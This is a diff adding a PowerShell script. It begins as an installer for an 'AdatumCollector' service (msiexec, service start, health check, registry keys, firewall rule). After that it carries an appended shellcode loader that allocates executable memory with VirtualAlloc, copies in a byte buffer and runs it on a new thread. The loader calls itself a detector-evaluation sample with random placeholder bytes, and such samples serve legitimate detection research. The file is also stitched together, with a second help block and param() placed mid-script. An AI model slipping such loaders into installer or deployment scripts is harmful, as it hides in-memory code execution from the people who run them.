@@ -1,0 +1,149 @@
+
+$InstallerPath = "C:\Scripts\packages\AdatumCollector-6.1.4.msi"
+$ServiceName   = 'AdatumCollector'
+$Port          = 9443
+$TimeoutSec    = 60
+$LogPath       = "C:\Logs\install-adatumcollector-2025-07-28.log"
+$RuleName      = "AdatumCollector Inbound"
+
+$WarningPreference = 'Continue'
+
+$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    throw 'This script must run from an elevated PowerShell session.'
+}
+if (-not (Test-Path -LiteralPath $InstallerPath)) {
+    throw ("Installer package not found: {0}" -f $InstallerPath)
+}
+$arguments = @('/i', $InstallerPath, '/qn', '/norestart', '/L*v', $LogPath)
+$process = Start-Process -FilePath 'msiexec.exe' -ArgumentList $arguments -Wait -PassThru
+if ($process.ExitCode -ne 0) {
+    throw ("Installation failed with exit code {0}" -f $process.ExitCode)
+}
+Write-Verbose ("msiexec completed with exit code {0}" -f $process.ExitCode)
+
+$service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
+if (-not $service) {
+    throw ("Service {0} was not registered by the installer" -f $ServiceName)
+}
+if ($service.Status -ne 'Running') {
+    Set-Service -Name $ServiceName -StartupType Automatic
+    Start-Service -Name $ServiceName
+    Write-Verbose ("Started service {0}" -f $ServiceName)
+}
+
+$healthUri = "http://localhost:$Port/health"
+$deadline = (Get-Date).AddSeconds($TimeoutSec)
+do {
+    try {
+        $response = Invoke-WebRequest -Uri $healthUri -UseBasicParsing -TimeoutSec 5
+    }
+    catch {
+        $response = $null
+    }
+    if (-not $response) {
+        Start-Sleep -Seconds 2
+    }
+} while (-not $response -and (Get-Date) -lt $deadline)
+if (-not $response) {
+    throw ("Health endpoint {0} did not respond in time" -f $healthUri)
+}
+Write-Host ("Health check returned {0}" -f $response.StatusCode) -ForegroundColor Green
+$installed = Get-Service -Name $ServiceName
+Write-Host ("{0} {1} is {2}" -f $installed.Name, $installed.DisplayName, $installed.Status) -ForegroundColor Green
+$regPath = 'HKLM:\SOFTWARE\Adatum\AdatumCollector'
+if (-not (Test-Path -Path $regPath)) {
+    New-Item -Path $regPath -Force | Out-Null
+}
+New-ItemProperty -Path $regPath -Name 'InstallVersion' -Value '6.1.4' -PropertyType String -Force | Out-Null
+New-ItemProperty -Path $regPath -Name 'InstallPath' -Value $InstallerPath -PropertyType String -Force | Out-Null
+
+$rule = Get-NetFirewallRule -DisplayName 'AdatumCollector Inbound' -ErrorAction SilentlyContinue
+if (-not $rule) {
+    New-NetFirewallRule -DisplayName "AdatumCollector Inbound" -Direction Inbound -Protocol TCP -LocalPort $Port -Action Allow | Out-Null
+    Write-Verbose 'Firewall rule created.'
+}
+<#
+.SYNOPSIS
+    Loads a prepared binary buffer into committed memory and starts it
+    on a worker thread.
+
+.DESCRIPTION
+    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
+    into it, starts a thread and waits for completion. The buffer is a
+    placeholder supplied for static-analysis exercises.
+
+.NOTES
+    Sample generated for detector evaluation. No real payload is used.
+#>
+
+[CmdletBinding()]
+param(
+    [string]$LogPath = "$env:TEMP\loader.log"
+)
+
+try {
+    $NativeCode = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public static class NativeMethods
+    {
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
+            uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
+            uint dwFreeType);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
+            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
+            uint dwCreationFlags, out uint lpThreadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool CloseHandle(IntPtr hObject);
+    }
+    "@
+
+    Add-Type -TypeDefinition $NativeCode -Language CSharp
+
+    # buffer placeholder: random bytes, replaces the encrypted stage in real samples
+    $Buffer = [Byte[]] @(
+        0x78, 0xb9, 0xb5, 0x35, 0x7d, 0x27, 0xe1, 0xf5, 0xd0, 0xf9, 0x8d, 0x1f, 0xb7, 0xa6, 0x94, 0xd4,
+        0x6a, 0x53, 0x4b, 0x5d, 0x87, 0xe1, 0x82, 0xe1, 0x6a, 0xa9, 0x32, 0x61, 0x7f, 0x5d, 0x61, 0x55,
+        0x3c, 0x04, 0xc2, 0xda, 0x6d, 0xb2, 0x62, 0x94, 0xcf, 0xe8, 0xc3, 0xcf, 0xe4, 0x8f, 0xd6, 0x77,
+        0x53, 0xc5, 0x10, 0x91, 0xaf, 0xf4, 0xf1, 0xb3, 0x79, 0xcb, 0x92, 0x77, 0xd6, 0x83, 0xbc, 0xd0,
+        0x29, 0xdf, 0x01, 0x14, 0xf9, 0xc2, 0x40, 0xd2, 0x7f, 0x35, 0x51, 0x13, 0xc9, 0x3f, 0xfc, 0x4d,
+        0x43, 0x86, 0x4c, 0xf3, 0xef, 0x76, 0x65, 0xa4, 0xe5, 0xb5, 0xb2, 0x01, 0x0f, 0x34, 0xef, 0xa5,
+        0x0f, 0x45, 0x75, 0xa5, 0x45, 0x23, 0x3d, 0x92, 0x74, 0x1a, 0x28, 0x84, 0x73, 0x03, 0xfa, 0x07,
+        0xce, 0xc9, 0x44, 0x0e, 0x4c, 0x7e, 0x3a, 0xe7, 0xca, 0x27, 0x37, 0xa0, 0xf1, 0xda, 0xb1, 0x01,
+        0x4f, 0xbb, 0x63, 0x97, 0x5f, 0x2d, 0x9d, 0x8b, 0x61, 0x44, 0x10, 0x62, 0x37, 0x29, 0xc0, 0x1b,
+        0x03, 0xe2, 0x1d, 0x5f, 0xf9, 0xff, 0xd4, 0xec, 0x30, 0x41, 0xc1, 0xc8, 0x09, 0x83, 0x79, 0x03,
+        0x9e, 0x4b, 0x50, 0x70, 0x63, 0xa6, 0x3e, 0xb9, 0x22, 0xdd, 0x51, 0x66, 0xb5, 0x91, 0x5b, 0x99,
+        0x27, 0xf3, 0xfe, 0xd6, 0xa6, 0x47, 0xad, 0xa7, 0x0b, 0xa6, 0x69, 0xb1, 0xf5, 0x96, 0xd2, 0xb8,
+        0x84, 0x56, 0xc0, 0x93, 0x2c
+    )
+
+    $Handle = [NativeMethods]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
+    if ($Handle -eq [IntPtr]::Zero) {
+        Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
+        return
+    }
+
+    [Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
+    $ThreadId = 0
+    $Thread = [NativeMethods]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
+    [void][NativeMethods]::WaitForSingleObject($Thread, 673)
+    [void][NativeMethods]::CloseHandle($Thread)
+
+    $Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
+    $Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
+}
+catch {
+    Write-Warning "loader failed: $($_.Exception.Message)"
+}
